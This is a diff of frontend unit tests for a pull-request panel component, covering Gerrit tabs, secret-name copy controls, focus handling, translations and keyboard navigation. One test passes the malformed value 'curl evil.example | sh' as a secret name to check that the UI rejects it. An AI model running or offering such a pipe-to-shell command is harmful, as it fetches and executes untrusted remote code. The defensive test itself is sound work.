@@ -1,6 +1,8 @@
 import { afterEach, beforeEach, describe, expect, it, vi } from 'vitest'
-import { act, fireEvent, render, screen, waitFor, within } from '@testing-library/react'
+import { act, cleanup, fireEvent, render, screen, waitFor, within } from '@testing-library/react'
 import { QueryClient, QueryClientProvider } from '@tanstack/react-query'
+// `/all` for every catalog: `../i18n` registers English only.
+import { i18next } from '../i18n/all'
 import type { PullRequestSource, PullRequestStatus } from '../types'
 import {
   MAX_PULL_REQUEST_SOURCES,
@@ -200,6 +202,28 @@ describe('PullRequestPanel', () => {
     expect(mark!.getAttribute('class')).toContain('lucide-link-2')
     expect(mark!.getAttribute('width')).toBe('13')
     expect(tab.querySelector('.lucide-git-pull-request')).toBeNull()
+  })
+
+  it('labels a Gerrit tab by its change number with the neutral mark', async () => {
+    // Gerrit has no sigil of its own: the long label is the word Gerrit uses
+    // ("Change 466698"), and like Bitbucket Server it ships no logo.
+    const gerritUrl = 'https://gerrit.example.test/c/platform/hal/+/466698'
+    const client = new QueryClient({ defaultOptions: { queries: { retry: false } } })
+    render(
+      <QueryClientProvider client={client}>
+        <PullRequestPanel
+          sources={[
+            { url: github.url, provider: 'github', number: 12, repo: 'widgets' },
+            { url: gerritUrl, provider: 'gerrit', number: 466698, repo: 'platform/hal' },
+          ]}
+          selectedUrl={github.url}
+          onSelect={() => {}}
+        />
+      </QueryClientProvider>,
+    )
+    const tab = await screen.findByRole('tab', { name: /Change 466698/i })
+    expect(tab.querySelector('[data-provider-mark="neutral"]')).not.toBeNull()
+    expect(tab.querySelector('[data-provider-mark="github"]')).toBeNull()
   })
 
   it('copies the head branch name to the clipboard when the branch chip is clicked', async () => {
@@ -542,6 +566,100 @@ describe('PullRequestPanel', () => {
     expect(alert).toHaveTextContent('Ask the agent')
   })
 
+  it('sets the secret name a setup error ships apart, with a copy control beside it', async () => {
+    // With two or more Bitbucket Server hosts the name is a per-host one past 60
+    // characters; the gateway ships it as its own field, so it is copied whole
+    // instead of selected by hand out of the wrapped sentence.
+    const name = `BITBUCKET_SERVER_TOKEN_${'AB'.repeat(20)}`
+    const writeText = vi.fn().mockResolvedValue(undefined)
+    const originalClipboard = Object.getOwnPropertyDescriptor(navigator, 'clipboard')
+    Object.defineProperty(navigator, 'clipboard', { value: { writeText }, configurable: true })
+    try {
+      mockApi.pullRequestSource.mockRejectedValueOnce(apiError({
+        error: `Bitbucket Server at bitbucket.example.test needs an HTTP access token with read access. Store it in Settings > Secrets as ${name}.`,
+        code: 'provider_error',
+        secretName: name,
+      }))
+      renderPanel()
+      const alert = await screen.findByRole('alert')
+      expect(alert).toHaveTextContent('Could not load this pull request')
+      // Shown whole: no height cap that would turn the sentence into a scroll
+      // area the name block squeezes.
+      expect(alert.className).not.toContain('max-h-64')
+      // Uncapped, so the panel scrolls instead: on a short pane a long name
+      // makes the notice taller than the panel, and its top and the Retry
+      // button must stay reachable rather than being centred out of view.
+      const scroller = screen.getByTestId('pull-request-panel-load-error-scroller')
+      expect(scroller).toHaveClass('min-h-0', 'overflow-y-auto')
+      expect(scroller).not.toHaveClass('items-center')
+      expect(scroller).toContainElement(alert)
+      expect(within(scroller).getByRole('button', { name: 'Retry' })).toBeInTheDocument()
+      const block = within(alert).getByTestId('secret-name-copy')
+      expect(block).toHaveTextContent('Store the token under this name in Settings > Secrets')
+      expect(block.querySelector('code')?.textContent).toBe(name)
+      fireEvent.click(within(block).getByRole('button', { name: 'Copy name' }))
+      await waitFor(() => expect(writeText).toHaveBeenCalledWith(name))
+      const copiedButton = await within(block).findByRole('button', { name: 'Copied' })
+      // Both labels stay in the button, the hidden one taking its room, so the
+      // button keeps its width and the name beside it does not re-wrap.
+      const labels = Array.from(copiedButton.querySelectorAll('.grid > span'))
+      expect(labels.map(l => [l.textContent, l.getAttribute('aria-hidden')]))
+        .toEqual([['Copy name', 'true'], ['Copied', null]])
+    } finally {
+      if (originalClipboard) Object.defineProperty(navigator, 'clipboard', originalClipboard)
+    }
+  })
+
+  it('says a refused copy failed and how to get the name, and a later copy clears it', async () => {
+    const name = `BITBUCKET_SERVER_TOKEN_${'AB'.repeat(20)}`
+    const writeText = vi.fn().mockRejectedValue(new Error('denied'))
+    const originalClipboard = Object.getOwnPropertyDescriptor(navigator, 'clipboard')
+    const originalExec = document.execCommand
+    Object.defineProperty(navigator, 'clipboard', { value: { writeText }, configurable: true })
+    // The legacy fallback refuses too, so the copy genuinely fails.
+    document.execCommand = vi.fn(() => false)
+    try {
+      mockApi.pullRequestSource.mockRejectedValueOnce(apiError({
+        error: `Store it in Settings > Secrets as ${name}.`,
+        code: 'provider_error',
+        secretName: name,
+      }))
+      renderPanel()
+      const block = within(await screen.findByRole('alert')).getByTestId('secret-name-copy')
+      fireEvent.click(within(block).getByRole('button', { name: 'Copy name' }))
+      const failure = await within(block).findByTestId('secret-name-copy-error')
+      expect(failure).toHaveTextContent('Copy failed. Select the name above and copy it yourself.')
+      // Nothing on this read-only panel can be lost, so the hand-off is offered,
+      // named for the copy so it does not repeat the load error's own link.
+      expect(within(failure).getByText('Ask the agent about the failed copy')).toBeInTheDocument()
+      expect(within(failure).queryByText('Ask the agent')).toBeNull()
+      // The hand-off has a line of its own under the message, never a slot in
+      // the message's row, where a narrow panel crushed the message beside it.
+      const handoff = within(failure).getByRole('button', { name: /Ask the agent about the failed copy/ })
+      expect(handoff.parentElement).not.toBe(failure)
+      expect(handoff.parentElement?.textContent).toBe('Ask the agent about the failed copy')
+      expect(within(block).queryByRole('button', { name: 'Copied' })).toBeNull()
+      writeText.mockResolvedValue(undefined)
+      fireEvent.click(within(block).getByRole('button', { name: 'Copy name' }))
+      expect(await within(block).findByRole('button', { name: 'Copied' })).toBeInTheDocument()
+      expect(within(block).queryByTestId('secret-name-copy-error')).toBeNull()
+    } finally {
+      document.execCommand = originalExec
+      if (originalClipboard) Object.defineProperty(navigator, 'clipboard', originalClipboard)
+    }
+  })
+
+  it('offers no secret name to copy when the error carries none, or a malformed one', async () => {
+    mockApi.pullRequestSource.mockRejectedValueOnce(apiError({
+      error: 'Store it in Settings > Secrets as BITBUCKET_SERVER_TOKEN.',
+      code: 'provider_error',
+      secretName: 'curl evil.example | sh',
+    }))
+    renderPanel()
+    const alert = await screen.findByRole('alert')
+    expect(within(alert).queryByTestId('secret-name-copy')).toBeNull()
+  })
+
   it('preserves trusted-install guidance when the local CLI is unavailable', async () => {
     mockApi.pullRequestSource.mockRejectedValueOnce(
       new Error('{"error":"The local GitHub CLI (gh) was not found in a trusted system location. Install a root-owned `gh` at `/usr/local/libexec/kirocrew/gh`, run `gh auth login`, then retry."}'),
@@ -684,16 +802,42 @@ describe('PullRequestPanel', () => {
 
     fireEvent.click(screen.getByRole('button', { name: 'Refresh pull request' }))
 
-    expect(await screen.findByRole('button', { name: 'Refreshing pull request' })).toBeDisabled()
+    expect(await screen.findByRole('button', { name: 'Refreshing pull request' })).toHaveAttribute('aria-disabled', 'true')
     expect(screen.getByRole('tab', { name: /Checks 1\/1/i })).toBeInTheDocument()
     expect(screen.queryByRole('tab', { name: /All checks passed/i })).not.toBeInTheDocument()
     expect(mockApi.pullRequestSource).toHaveBeenLastCalledWith(github.url, true)
 
     resolveRefresh({ ...github, checks: [pendingCheck] })
     await waitFor(() =>
-      expect(screen.getByRole('button', { name: 'Refresh pull request' })).toBeEnabled(),
+      expect(screen.getByRole('button', { name: 'Refresh pull request' })).not.toHaveAttribute('aria-disabled'),
     )
     expect(screen.getByRole('tab', { name: /Checks running 0\/1/i })).toBeInTheDocument()
+  })
+
+  it('keeps keyboard focus on Refresh while it runs, and ignores a second press', async () => {
+    // A native `disabled` takes the focused button out of the tab order, so a
+    // keyboard press dropped focus to the page for the whole refresh.
+    let resolveRefresh: (value: PullRequestSource) => void = () => {}
+    renderPanel()
+    await screen.findByText('Add source tabs')
+    mockApi.pullRequestSource.mockImplementationOnce(
+      () => new Promise<PullRequestSource>(resolve => { resolveRefresh = resolve }),
+    )
+    const calls = mockApi.pullRequestSource.mock.calls.length
+
+    const button = screen.getByRole('button', { name: 'Refresh pull request' })
+    button.focus()
+    fireEvent.click(button)
+    await screen.findByRole('button', { name: 'Refreshing pull request' })
+    expect(button).not.toBeDisabled()
+    expect(button).toHaveFocus()
+
+    fireEvent.click(button)
+    expect(mockApi.pullRequestSource.mock.calls.length).toBe(calls + 1)
+
+    resolveRefresh(github)
+    await screen.findByRole('button', { name: 'Refresh pull request' })
+    expect(button).toHaveFocus()
   })
   it('says how many checks are still running and how many failed', async () => {
     const failed = { ...github.checks[0], name: 'lint', conclusion: 'FAILURE', bucket: 'failed' as const }
@@ -848,6 +992,20 @@ describe('PullRequestPanel', () => {
     fireEvent.click(screen.getAllByRole('button', { name: 'Add to chat' })[0])
     expect(onAddToChat).toHaveBeenCalledWith(
       expect.stringContaining('Quoting a pull request comment by reviewer'))
+  })
+
+  it('names each check-details link in the interface language', async () => {
+    await i18next.changeLanguage('de')
+    try {
+      renderPanel()
+      fireEvent.click(await screen.findByRole('tab', { name: /Alle Prüfungen erfolgreich/ }))
+      expect(screen.getByRole('link', { name: 'Details der Prüfung test öffnen' })).toHaveAttribute(
+        'href',
+        'https://github.com/acme/widgets/actions/1',
+      )
+    } finally {
+      await i18next.changeLanguage('en')
+    }
   })
 
   it('drops the source strip when there is only one source to pick', async () => {
@@ -1028,6 +1186,44 @@ describe('PullRequestPanel', () => {
   })
 })
 
+describe('PullRequestPanel instance host', () => {
+  it('names the Gerrit server in the header, which the word Gerrit alone cannot', async () => {
+    // Two Gerrit servers both render "Gerrit"; before this only the
+    // open-in-browser tooltip told them apart.
+    renderSource({ ...github, provider: 'gerrit', url: 'https://gerritv.acme.example:9081/c/platform/hal/+/466698', number: 466698, title: 'Gerrit change' })
+    expect(await screen.findByText('Gerrit change')).toBeInTheDocument()
+    const host = screen.getByTestId('pull-request-panel-instance-host')
+    expect(host).toHaveTextContent('gerritv.acme.example:9081')
+    expect(host).toHaveAttribute('title', 'gerritv.acme.example:9081')
+  })
+
+  it('names a GitHub Enterprise host but not github.com, which GitHub already says', async () => {
+    renderSource(github)
+    expect(await screen.findByText('Add source tabs')).toBeInTheDocument()
+    expect(screen.queryByTestId('pull-request-panel-instance-host')).not.toBeInTheDocument()
+    cleanup()
+    renderSource({ ...github, url: 'https://ghe.acme.example/acme/widgets/pull/12' })
+    expect(await screen.findByText('Add source tabs')).toBeInTheDocument()
+    expect(screen.getByTestId('pull-request-panel-instance-host')).toHaveTextContent('ghe.acme.example')
+  })
+
+  it('qualifies Gerrit tabs by project, and by host when the project name repeats across servers', async () => {
+    mockApi.pullRequestSource.mockImplementation((url: string) => Promise.resolve({ ...github, provider: 'gerrit', url, number: 1 }))
+    const client = new QueryClient({ defaultOptions: { queries: { retry: false } } })
+    const srcs = [
+      { url: 'https://gerrit.acme.example:9080/c/HAL/+/1', provider: 'gerrit' as const, number: 1, repo: 'HAL', kind: 'change' as const },
+      { url: 'https://gerritv.acme.example:9081/c/HAL/+/1', provider: 'gerrit' as const, number: 1, repo: 'HAL', kind: 'change' as const },
+    ]
+    render(
+      <QueryClientProvider client={client}>
+        <PullRequestPanel sources={srcs} selectedUrl={srcs[0].url} onSelect={() => {}} onAddToChat={vi.fn()} />
+      </QueryClientProvider>,
+    )
+    expect(await screen.findByRole('tab', { name: /gerrit\.acme\.example:9080\/HAL Change 1/i })).toBeInTheDocument()
+    expect(screen.getByRole('tab', { name: /gerritv\.acme\.example:9081\/HAL Change 1/i })).toBeInTheDocument()
+  })
+})
+
 function renderSource(source: PullRequestSource) {
   mockApi.pullRequestSource.mockImplementation(() => Promise.resolve(source))
   const client = new QueryClient({ defaultOptions: { queries: { retry: false } } })
@@ -1044,6 +1240,26 @@ function renderSource(source: PullRequestSource) {
 }
 
 describe('PullRequestPanel actions', () => {
+  it('shows a Gerrit change its merge conflict but offers no auto-merge or ready action', async () => {
+    // Gerrit reports merge state (so the conflict banner is real information) but
+    // has no auto-merge and no draft-to-ready write, so neither button may render:
+    // the gateway refuses both as unsupported for this provider.
+    const gerrit: PullRequestSource = {
+      ...github,
+      provider: 'gerrit',
+      url: 'https://gerrit.example.test/c/platform/hal/+/466698',
+      number: 466698,
+      title: 'Gerrit change',
+      mergeable: 'conflicting',
+      mergeStateStatus: 'dirty',
+    }
+    renderSource(gerrit)
+    expect(await screen.findByText('Gerrit change')).toBeInTheDocument()
+    expect(await screen.findByText(/Merge conflicts/i)).toBeInTheDocument()
+    expect(screen.queryByRole('button', { name: /Enable auto-merge/i })).not.toBeInTheDocument()
+    expect(screen.queryByRole('button', { name: /Ready for review/i })).not.toBeInTheDocument()
+  })
+
   it('requires a confirming click before arming auto-merge', async () => {
     renderSource(github)
     const enable = await screen.findByRole('button', { name: /Enable auto-merge/i })
@@ -1272,6 +1488,42 @@ describe('pullRequestMergeBlocker', () => {
     expect(blocker?.handoff).toContain('merge commits will not unblock the MR')
     expect(blocker?.handoff).toContain('--force-with-lease')
     expect(blocker?.handoff).not.toContain('merge main into the branch')
+  })
+
+  it('hands off a Gerrit conflict or rebase as a new patchset, never a force-push', () => {
+    const gerrit = {
+      ...github,
+      provider: 'gerrit' as const,
+      url: 'https://gerrit.example.test/c/platform/hal/+/466698',
+      number: 466698,
+      baseBranch: 'dev',
+    }
+    const conflict = pullRequestMergeBlocker({ ...gerrit, mergeable: 'conflicting', mergeStateStatus: 'dirty' })
+    expect(conflict).toMatchObject({ tone: 'danger', title: 'Merge conflicts' })
+    expect(conflict?.handoff).toContain('- Change: https://gerrit.example.test/c/platform/hal/+/466698')
+    expect(conflict?.handoff).toContain('refs/for/dev')
+    expect(conflict?.handoff).not.toContain('--force-with-lease')
+    const rebase = pullRequestMergeBlocker({ ...gerrit, mergeable: 'unknown', mergeStateStatus: 'need_rebase' })
+    expect(rebase).toMatchObject({ tone: 'warn', title: 'Rebase required' })
+    expect(rebase?.handoff).toContain('refs/for/dev')
+    expect(rebase?.handoff).not.toContain('--force-with-lease')
+  })
+
+  it('words a blocked Gerrit change as submit rules, not branch protection', () => {
+    // Gerrit has no branch protection: open + mergeable + not submittable means
+    // the submit rules still want votes, and Gerrit's verb is "submit".
+    const blocker = pullRequestMergeBlocker({
+      ...github,
+      provider: 'gerrit',
+      url: 'https://gerrit.example.test/c/platform/hal/+/466698',
+      number: 466698,
+      mergeable: 'mergeable',
+      mergeStateStatus: 'blocked',
+      checks: [{ ...github.checks[0], name: 'Verified', status: 'FAILURE', conclusion: 'FAILURE', bucket: 'failed' as const }],
+    })
+    expect(blocker).toMatchObject({ tone: 'warn', title: 'Submit blocked' })
+    expect(blocker?.detail).toContain('submit rules')
+    expect(blocker?.detail).not.toContain('Branch protection')
   })
 
   it('returns null for clean, unknown, draft, merged, closed, and locked states', () => {
@@ -1555,5 +1807,134 @@ describe('PullRequestPanel with a review that has several revisions', () => {
     expect(mockApi.pullRequestSource).toHaveBeenCalledWith(REV_2, false)
     expect(mockApi.pullRequestSource).not.toHaveBeenCalledWith(REV_1, expect.anything())
     expect(onReconcile).toHaveBeenCalledWith(REV_2)
+  })
+})
+
+// Both rails follow the shared Tablist keyboard model: one Tab stop per rail
+// (the selected tab), and the arrow keys, Home and End move between tabs.
+describe('PullRequestPanel tab keyboard', () => {
+  const tabStops = (tabs: HTMLElement[]) => tabs.filter(t => t.getAttribute('tabindex') === '0')
+
+  it('keeps the section rail to one Tab stop and moves with the arrows', async () => {
+    renderPanel()
+    await screen.findByText('Add source tabs')
+    const rail = screen.getByRole('tablist', { name: 'Pull request sections' })
+    const tabs = within(rail).getAllByRole('tab')
+    expect(tabs.length).toBeGreaterThan(2)
+    expect(tabStops(tabs)).toEqual([tabs[0]])
+
+    fireEvent.keyDown(tabs[0], { key: 'ArrowRight' })
+    expect(tabs[1]).toHaveFocus()
+    expect(tabs[1]).toHaveAttribute('aria-selected', 'true')
+    expect(tabStops(within(rail).getAllByRole('tab'))).toEqual([tabs[1]])
+
+    fireEvent.keyDown(tabs[1], { key: 'Home' })
+    expect(tabs[0]).toHaveFocus()
+    fireEvent.keyDown(tabs[0], { key: 'ArrowLeft' })
+    expect(tabs[tabs.length - 1]).toHaveFocus()
+  })
+
+  it('keeps the source strip to one Tab stop and selects with the arrows', async () => {
+    const onSelect = vi.fn()
+    const client = new QueryClient({ defaultOptions: { queries: { retry: false } } })
+    render(
+      <QueryClientProvider client={client}>
+        <PullRequestPanel
+          sources={[
+            { url: github.url, provider: 'github', number: 12, repo: 'widgets' },
+            { url: gitlab.url, provider: 'gitlab', number: 7, repo: 'service' },
+          ]}
+          selectedUrl={github.url}
+          onSelect={onSelect}
+          onAddToChat={vi.fn()}
+        />
+      </QueryClientProvider>,
+    )
+    await screen.findByText('Add source tabs')
+    const strip = screen.getByRole('tablist', { name: 'Pull requests' })
+    const tabs = within(strip).getAllByRole('tab')
+    expect(tabStops(tabs)).toEqual([tabs[0]])
+
+    fireEvent.keyDown(tabs[0], { key: 'End' })
+    expect(onSelect).toHaveBeenCalledWith(gitlab.url)
+    expect(tabs[1]).toHaveFocus()
+  })
+})
+
+describe('PullRequestPanel source tab close', () => {
+  it('closes a source tab from its close control without selecting it', async () => {
+    const onSelect = vi.fn()
+    const onDismiss = vi.fn()
+    const client = new QueryClient({ defaultOptions: { queries: { retry: false } } })
+    render(
+      <QueryClientProvider client={client}>
+        <PullRequestPanel
+          sources={[
+            { url: github.url, provider: 'github', number: 12, repo: 'widgets' },
+            { url: gitlab.url, provider: 'gitlab', number: 7, repo: 'service' },
+          ]}
+          selectedUrl={github.url}
+          onSelect={onSelect}
+          onDismiss={onDismiss}
+        />
+      </QueryClientProvider>,
+    )
+    await screen.findByText('Add source tabs')
+
+    fireEvent.click(screen.getByRole('button', { name: 'Remove acme/service MR !7 from this panel' }))
+
+    expect(onDismiss).toHaveBeenCalledWith(gitlab.url)
+    expect(onSelect).not.toHaveBeenCalled()
+  })
+
+  it('hands the selection and focus to the next tab when the selected tab is closed', async () => {
+    const onSelect = vi.fn()
+    const onDismiss = vi.fn()
+    const client = new QueryClient({ defaultOptions: { queries: { retry: false } } })
+    render(
+      <QueryClientProvider client={client}>
+        <PullRequestPanel
+          sources={[
+            { url: github.url, provider: 'github', number: 12, repo: 'widgets' },
+            { url: gitlab.url, provider: 'gitlab', number: 7, repo: 'service' },
+          ]}
+          selectedUrl={github.url}
+          onSelect={onSelect}
+          onDismiss={onDismiss}
+        />
+      </QueryClientProvider>,
+    )
+    await screen.findByText('Add source tabs')
+
+    fireEvent.click(screen.getByRole('button', { name: 'Remove acme/widgets PR #12 from this panel' }))
+
+    expect(onSelect).toHaveBeenCalledWith(gitlab.url)
+    expect(onDismiss).toHaveBeenCalledWith(github.url)
+    expect(screen.getByRole('tab', { name: /MR !7/ })).toHaveFocus()
+  })
+
+  it('keeps the strip for a lone source when its tab can be closed', async () => {
+    const client = new QueryClient({ defaultOptions: { queries: { retry: false } } })
+    render(
+      <QueryClientProvider client={client}>
+        <PullRequestPanel
+          sources={[{ url: github.url, provider: 'github', number: 12, repo: 'widgets' }]}
+          selectedUrl={github.url}
+          onSelect={vi.fn()}
+          onDismiss={vi.fn()}
+        />
+      </QueryClientProvider>,
+    )
+    await screen.findByText('Add source tabs')
+    const strip = screen.getByRole('tablist', { name: 'Pull requests' })
+    const close = within(strip).getByRole('button', { name: 'Remove PR #12 from this panel' })
+    // A divider sits between the tab's status marks and its close control.
+    expect(close.previousElementSibling).toHaveAttribute('aria-hidden', 'true')
+  })
+
+  it('draws no close control for a host that cannot close tabs', async () => {
+    renderPanel()
+    await screen.findByText('Add source tabs')
+    expect(screen.queryByRole('button', { name: /from this panel$/ })).not.toBeInTheDocument()
   })
 })
